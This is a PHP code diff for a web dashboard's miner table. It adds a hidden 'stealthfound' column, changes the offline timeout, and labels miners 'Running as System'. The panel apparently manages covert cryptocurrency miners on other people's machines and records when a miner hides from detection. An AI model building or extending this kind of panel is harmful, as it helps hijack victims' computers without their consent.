@@ -25,12 +25,24 @@
                         'db_column'=>'ip',
                         'display'=>'IP'
                     ],
+                    'stealthfound'=>[
+                        'db_column'=>'stealthfound',
+                        'hidden'=>true
+                    ],
                     'status'=>[
                         'db_column'=>'status',
                         'display'=>$larr['Status'],
                         'formatting'=>function($d, $s){
-                            $offline = isset($s['ms_lastConnection']) && ((strtotime(date("Y-m-d H:i:s")) - strtotime($s['ms_lastConnection'])) > 300);
-                            return unamtMinerStatus(empty($s['ms_pool']) ? 7 : ($offline ? -1 : $d)).($offline ? unamtStatusColor('red', " (".unamtTimeFormat((strtotime(date("Y-m-d H:i:s")) - strtotime($s['ms_lastConnection'])), true).")") : '');
+                            global $larr;
+                            $offline = isset($s['ms_lastConnection']) && ((strtotime(date("Y-m-d H:i:s")) - strtotime($s['ms_lastConnection'])) > 180);
+                            $status = unamtMinerStatus(empty($s['ms_pool']) ? 7 : ($offline ? -1 : $d));
+                            if($offline) {
+                                $status .= unamtStatusColor('red', " (".unamtTimeFormat((strtotime(date("Y-m-d H:i:s")) - strtotime($s['ms_lastConnection'])), true).")");
+                            }
+                            if($d == 4) {
+                                $status = str_replace('{REASON}', !empty($s['ms_stealthfound']) ? $s['ms_stealthfound'] : $larr['Unknown'], $status);
+                            }
+                            return $status;
                         }
                     ],
                     'algorithm'=>[
@@ -94,7 +106,11 @@
                     ],
                     'activewindow'=>[
                         'db_column'=>'activewindow',
-                        'display'=>$larr['active_window']
+                        'display'=>$larr['active_window'],
+                        'formatting'=>function($d){
+                            global $larr;
+                            return $d == 'Running as System' ? $larr['running_as_system']: $d;
+                        }
                     ],
                     'runtime'=>[
                         'db_column'=>'runtime',
